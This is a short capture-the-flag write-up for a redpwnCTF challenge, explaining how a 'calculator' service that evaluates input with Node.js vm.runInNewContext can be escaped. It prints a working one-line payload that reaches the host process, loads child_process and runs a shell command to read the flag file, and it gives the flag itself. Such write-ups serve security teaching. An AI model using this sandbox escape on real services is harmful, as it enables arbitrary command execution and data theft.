# Challenge Name

Author: [roerohan](https://github.com/roerohan)

Node.js `vm` module exploit.

# Requirements

- Node.js

# Source

- [calculator.js](./calculator.js)

```
Who needs regex for sanitization when we have VMs?!?!

The flag is at /ctf/flag.txt

nc 2020.redpwnc.tf 31273
```

# Exploitation

Not all programs that run in `vm`s are isolated. When you run this program, it shows

```
Welcome to my Calculator-as-a-Service (CaaS)!
This calculator lets you use the full power of Javascript for
your computations! Try `Math.log(Math.expm1(5) + 1)`
Type q to exit.
>
```

Now, you can pass anything as a string and it will be executed in the `vm.runInNewContext()` function.

```javascript
const result = vm.runInNewContext(input)
      process.stdout.write(result + '\n')
```

So, we can simply get the process, require the `child_process` module, and execute `cat /ctf/flag.txt`.

```javascript
const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()
```

The flag is:

```
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```
